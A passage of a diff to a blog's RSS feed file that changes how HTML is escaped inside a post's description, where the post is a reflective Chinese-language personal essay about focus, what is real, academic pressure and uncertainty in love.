-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;什么是专注？
+一想到这，就很难积极起来了。&lt;/p>
+&lt;h2 id="专注和分心" >专注和分心
+&lt;span>
+&lt;a href="#%e4%b8%93%e6%b3%a8%e5%92%8c%e5%88%86%e5%bf%83">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>什么是专注？
 每天，每周，时时刻刻在工作，在想着工作，算专注吗？
 社交，娱乐，追逐一些虚无缥缈的东西算分心吗？
 显然这学期相比于上学期是没有那么专注的。
-但是无论专注还是分心，似乎都没找到让自己很满意的状态。&lt;/p&gt;
-&lt;h2 id=&#34;虚假和真实&#34; &gt;虚假和真实
-&lt;span&gt;
-    &lt;a href=&#34;#%e8%99%9a%e5%81%87%e5%92%8c%e7%9c%9f%e5%ae%9e&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;什么是虚假，什么是真实。
+但是无论专注还是分心，似乎都没找到让自己很满意的状态。&lt;/p>
+&lt;h2 id="虚假和真实" >虚假和真实
+&lt;span>
+&lt;a href="#%e8%99%9a%e5%81%87%e5%92%8c%e7%9c%9f%e5%ae%9e">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>什么是虚假，什么是真实。
 最近感觉有些不真实，或许是压力很大，所以总想要抓住些什么。
 什么是真实的，paper，reputation，money是真实的吗？
 什么是虚假的，爱情，友情是虚假的吗？
 痛苦是真实的吗？
-快乐是虚假的吗？&lt;/p&gt;
-&lt;p&gt;感觉已经渐渐分不清了，似乎自己曾经想追求的东西，现在也渐渐变得模糊。&lt;/p&gt;
-&lt;h2 id=&#34;输和赢&#34; &gt;输和赢
-&lt;span&gt;
-    &lt;a href=&#34;#%e8%be%93%e5%92%8c%e8%b5%a2&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;感觉随着年龄的增长，如何定义输和赢也变得越来越模糊。
+快乐是虚假的吗？&lt;/p>
+&lt;p>感觉已经渐渐分不清了，似乎自己曾经想追求的东西，现在也渐渐变得模糊。&lt;/p>
+&lt;h2 id="输和赢" >输和赢
+&lt;span>
+&lt;a href="#%e8%be%93%e5%92%8c%e8%b5%a2">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>感觉随着年龄的增长，如何定义输和赢也变得越来越模糊。
 年轻时，一场比赛，一次胜利，都是能很满足。
 但是现在，感觉似乎没有什么那么值得我开心。
-做学术本来就是正反馈比较少的一条路，走下去我真的会开心吗。&lt;/p&gt;
-&lt;h2 id=&#34;缘分与现实&#34; &gt;缘分与现实
-&lt;span&gt;
-    &lt;a href=&#34;#%e7%bc%98%e5%88%86%e4%b8%8e%e7%8e%b0%e5%ae%9e&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;其实这里主要想说一说感情。
+做学术本来就是正反馈比较少的一条路，走下去我真的会开心吗。&lt;/p>
+&lt;h2 id="缘分与现实" >缘分与现实
+&lt;span>
+&lt;a href="#%e7%bc%98%e5%88%86%e4%b8%8e%e7%8e%b0%e5%ae%9e">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>其实这里主要想说一说感情。
 感觉自己相比于去年对待感情成熟了很多。
-但也觉得对于自己的另一半会是怎样依然很模糊。&lt;/p&gt;
-&lt;p&gt;像我这样的人，注定是要流浪的吧。
-所以感情对于我来说，似乎成了奢侈的东西。&lt;/p&gt;
-&lt;p&gt;喜欢，心动，最终似乎都要回归到现实。
+但也觉得对于自己的另一半会是怎样依然很模糊。&lt;/p>
+&lt;p>像我这样的人，注定是要流浪的吧。
+所以感情对于我来说，似乎成了奢侈的东西。&lt;/p>
+&lt;p>喜欢，心动，最终似乎都要回归到现实。
 在没安定的年纪，追求爱情，显得那么的无力。
-就算真的真的很喜欢，又能怎样呢。&lt;/p&gt;
-&lt;p&gt;不应该轻易许诺未来，
+就算真的真的很喜欢，又能怎样呢。&lt;/p>
+&lt;p>不应该轻易许诺未来，
 但我做不到单纯享受当下。
 什么是正缘，什么是萍水相逢。
 我分不清。
-也许，有些问题不总是有答案的吧。&lt;/p&gt;
-&lt;p&gt;总有人跟我说，你就是还没遇到对的人。
-那如果总是默许错过，是不是有一天会后悔。&lt;/p&gt;
-&lt;p&gt;如果生活中有个人可以牵动自己那已经死了的心，似乎也还不错。&lt;/p&gt;
-</description>
-    </item>
-    
-  </channel>
-</rss>
+也许，有些问题不总是有答案的吧。&lt;/p>
+&lt;p>总有人跟我说，你就是还没遇到对的人。
+那如果总是默许错过，是不是有一天会后悔。&lt;/p>
+&lt;p>如果生活中有个人可以牵动自己那已经死了的心，似乎也还不错。&lt;/p></description></item></channel></rss>
